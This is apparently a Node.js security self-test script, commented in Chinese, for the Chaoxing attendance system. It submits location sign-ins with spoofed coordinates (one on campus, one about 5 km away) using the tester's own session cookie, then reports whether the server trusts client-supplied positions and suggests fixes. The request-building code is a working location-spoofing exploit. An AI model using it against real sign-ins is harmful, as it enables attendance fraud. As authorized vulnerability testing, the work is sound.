/*
 * 位置签到「服务端是否盲信客户端坐标」验证脚本
 * ============================================
 *
 * 用途
 * ----
 * 用于教学/教务系统的安全自评：同一个签到活动、同一个账号、只改一个变量
 * （提交的经纬度），观察服务端是否两次都接受。如果校内、校外两个坐标都返回
 * 成功，就说明服务端只做"距离判断"，而距离所用的坐标完全由客户端提供——
 * 这是这类签到机制的结构性弱点，值得写进漏洞报告。
 *
 * 运行
 * ----
 *   node tools/verify-location-trust.mjs            # 先看要准备什么
 *   node tools/verify-location-trust.mjs --run      # 真正提交（会连续发 2 个请求）
 *
 * 需要你自己准备（脚本不猜、不抓、不存账号密码）
 * ----------------------------------------------
 *   1) 一个**你自己的测试账号**在浏览器里登录 i.chaoxing.com
 *   2) 从开发者工具 Network 里复制该站点的 Cookie 头（含 _uid 等）
 *   3) 一个**你自己发布的、仍在进行中**的签到活动的 activeId
 *      （形如 https://mobilelearn.chaoxing.com/page/sign/signIn?...&activeId=4000175553141）
 *   4) 你自己的学校 fid（签到页 URL 里的 fid 参数）
 *   把它们填进下面的 CONFIG，或写进同目录的 verify-config.json
 *
 * 使用边界（请务必遵守）
 * --------------------
 *   - 仅限**你自己的账号**、**你自己发布的活动**
 *   - 不要拿这个去签别人的到，不要批量提交，不要用于真实考勤
 *   - 建议先跟学校信息化部门/教务处报备，这属于授权范围内的安全测试
 *
 * 结果怎么读
 * ----------
 *   两次都返回 success          → 服务端盲信客户端坐标（漏洞成立）
 *   校内 success、校外被判超范围 → 服务端有距离校验，但坐标仍来自客户端
 *   两次都失败                  → 校验更强（或有票据/签名机制），需要进一步分析
 */

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));

// ---------------------------------------------------------------------------
// CONFIG：请填写你自己的信息（也可写到 verify-config.json 里，格式相同）
// ---------------------------------------------------------------------------

const CONFIG = {
  // 目标签到活动编号（你自己发的那个）
  activeId: '',

  // 你的学校 fid（签到页 URL 里的 fid=xxxx）
  fid: '',

  // 你的测试账号登录后的 Cookie 整串（浏览器 Network 面板里复制）
  cookie: '',

  // 显示用的姓名（可留空，留空则服务端按账号推断）
  name: '',

  // 两组对照坐标：[纬度, 经度]，坐标系为 GCJ-02（国内地图通用）
  // 下面这组默认值 = 河北师范大学裕华校区 vs 石家庄市中心，相距约 5.1 公里
  inside: [37.99718, 114.520905],   // 校内（老师设定的签到点附近）
  outside: [38.042979, 114.514093], // 校外（石家庄市中心，人民广场一带）
};

// 覆盖：如果存在 verify-config.json，用它覆盖上面的默认值
const cfgFile = path.join(here, 'verify-config.json');
let cfg = CONFIG;
if (fs.existsSync(cfgFile)) {
  try {
    cfg = Object.assign({}, CONFIG, JSON.parse(fs.readFileSync(cfgFile, 'utf8')));
    console.log('（已读取 verify-config.json）');
  } catch (e) {
    console.error('verify-config.json 解析失败：' + e.message);
    process.exit(1);
  }
}

const SIGN_HOST = 'https://mobilelearn.chaoxing.com';
const DO_RUN = process.argv.includes('--run');

// ---------------------------------------------------------------------------

function buildUrl(lat, lon) {
  const qs = [
    ['name', cfg.name || ''],
    ['address', ''],
    ['activeId', cfg.activeId],
    ['uid', (cfg.cookie.match(/(?:^|;\s*)_uid=([^;]*)/) || [])[1] || ''],
    ['clientip', ''],
    ['latitude', Number(lat).toFixed(6)],
    ['longitude', Number(lon).toFixed(6)],
    ['fid', cfg.fid],
    ['appType', '15'],
    ['ifTiJiao', '1'],
  ]
    .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
    .join('&');
  return `${SIGN_HOST}/pptSign/stuSignajax?${qs}`;
}

/** 两点间距离（米），用于报告里说明"这两次差了多少" */
function distance(a, b) {
  const R = 6371008.8;
  const rad = (x) => (x * Math.PI) / 180;
  const dLat = rad(b[0] - a[0]);
  const dLon = rad(b[1] - a[1]);
  const h =
    Math.sin(dLat / 2) ** 2 +
    Math.cos(rad(a[0])) * Math.cos(rad(b[0])) * Math.sin(dLon / 2) ** 2;
  return 2 * R * Math.asin(Math.min(1, Math.sqrt(h)));
}

function checkPrereqs() {
  const missing = [];
  if (!cfg.activeId) missing.push('activeId（你自己发布的签到活动编号）');
  if (!cfg.cookie) missing.push('cookie（你自己测试账号的登录 Cookie）');
  if (!cfg.fid) missing.push('fid（你学校的 fid，签到页 URL 里有）');
  return missing;
}

async function submit(label, coord) {
  const url = buildUrl(coord[0], coord[1]);
  const started = Date.now();
  let status = 0;
  let body = '';
  try {
    const res = await fetch(url, {
      method: 'GET',
      headers: {
        Cookie: cfg.cookie,
        Accept: '*/*',
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      redirect: 'follow',
    });
    status = res.status;
    body = (await res.text()).trim();
  } catch (e) {
    body = '请求异常：' + (e && e.message ? e.message : String(e));
  }
  const ms = Date.now() - started;

  const verdict =
    body === 'success' || /"success"\s*:\s*true/i.test(body)
      ? '接受（success）'
      : /请先登录|未登录/.test(body)
        ? '被拒：未登录'
        : /已签到|重复/.test(body)
          ? '被拒：已签到'
          : /结束|过期/.test(body)
            ? '被拒：活动已结束'
            : body
              ? '被拒：' + body.slice(0, 60)
              : '被拒：空响应（HTTP ' + status + '）';

  return { label, coord, status, body: body.slice(0, 300), ms, verdict, url };
}

// ---------------------------------------------------------------------------

console.log(`
位置签到「服务端是否盲信客户端坐标」验证
========================================
`);

const missing = checkPrereqs();
if (missing.length) {
  console.log('还缺这些信息，先补齐再跑：');
  for (const m of missing) console.log('  - ' + m);
  console.log(`
怎么准备：
  1. 浏览器登录 i.chaoxing.com（用你自己的测试账号）
  2. F12 → Network → 随便点一个 chaoxing 请求 → 复制 Request Headers 里的 Cookie 整串
  3. 打开你发布的那次签到，地址栏里 ?...&activeId=XXXXXXXXXXX&... 就是 activeId
  4. 把 activeId / fid / cookie 填进本文件顶部的 CONFIG，
     或另存一份 verify-config.json（格式相同，不会被 git 跟踪）

填好后运行：
  node tools/verify-location-trust.mjs --run
`);
  process.exit(0);
}

const gap = distance(cfg.inside, cfg.outside);

console.log('将要提交的两组坐标（同一个 activeId，只改坐标）：');
console.log(`  校内：${cfg.inside[0]}, ${cfg.inside[1]}`);
console.log(`  校外：${cfg.outside[0]}, ${cfg.outside[1]}`);
console.log(`  两地相距：${(gap / 1000).toFixed(2)} 公里`);
console.log(`  目标活动：activeId=${cfg.activeId}  fid=${cfg.fid}`);
console.log('');

if (!DO_RUN) {
  console.log('以上是待提交内容，**还没有真的发送**。');
  console.log('确认无误后加 --run 参数执行：');
  console.log('  node tools/verify-location-trust.mjs --run');
  console.log('');
  console.log('提醒：请只对自己的账号和自己发布的活动做这个验证。');
  process.exit(0);
}

console.log('开始提交（共 2 个请求，中间间隔 3 秒）…\n');

const first = await submit('校内坐标', cfg.inside);
console.log(`[1/2] ${first.label}  ${first.coord.join(', ')}`);
console.log(`      HTTP ${first.status} · ${first.ms}ms`);
console.log(`      服务端返回：${JSON.stringify(first.body)}`);
console.log(`      判定：${first.verdict}\n`);

await new Promise((r) => setTimeout(r, 3000));

const second = await submit('校外坐标', cfg.outside);
console.log(`[2/2] ${second.label}  ${second.coord.join(', ')}`);
console.log(`      HTTP ${second.status} · ${second.ms}ms`);
console.log(`      服务端返回：${JSON.stringify(second.body)}`);
console.log(`      判定：${second.verdict}\n`);

// ---------------------------------------------------------------------------
// 结论
// ---------------------------------------------------------------------------

const ok1 = /接受/.test(first.verdict);
const ok2 = /接受/.test(second.verdict);

console.log('='.repeat(60));
console.log('结论');
console.log('='.repeat(60));
if (ok1 && ok2) {
  console.log('两次都返回 success。');
  console.log('');
  console.log('说明：同一个活动、同一个账号，只把坐标从校内换到 ' + (gap / 1000).toFixed(2) +
    ' 公里外，服务端一样接受。');
  console.log('即"位置校验"所用的坐标完全由客户端提供，服务端没有独立的位置来源。');
  console.log('→ 漏洞成立，建议写进报告。');
} else if (ok1 && !ok2) {
  console.log('校内被接受，校外被拒绝。');
  console.log('');
  console.log('说明：服务端确实做了距离校验（这点是对的），但校验所依赖的坐标仍然来自客户端。');
  console.log('→ 校验存在，只是输入不可信；报告里应写"输入源不可信"而非"无校验"。');
} else if (!ok1 && !ok2) {
  console.log('两次都被拒绝。');
  console.log('');
  console.log('可能原因：活动已结束、账号未登录、activeId 不对，或服务端有更强的校验');
  console.log('（签名/票据/时间戳等）。需要先排除前几种，再判断是否存在更强的机制。');
} else {
  console.log('校内被拒、校外被接受——这个组合比较反常，建议人工核查参数是否正确。');
}
console.log('');
console.log('报告建议的修复方向：');
console.log('  1. 位置来源不能只信客户端上报，应引入服务端可验证的信号');
console.log('  2. 请求加签名与时效（timestamp + nonce + 服务端密钥）');
console.log('  3. 同一 activeId 下做坐标聚类/异常检测（短时间多人同坐标、坐标跳变）');
console.log('  4. 关键考勤场景改用教师端可控的方式（扫码、动态口令、现场确认）');
console.log('');
console.log('提醒：本次只提交了 2 个请求。请勿用它做批量提交或给他人使用。');
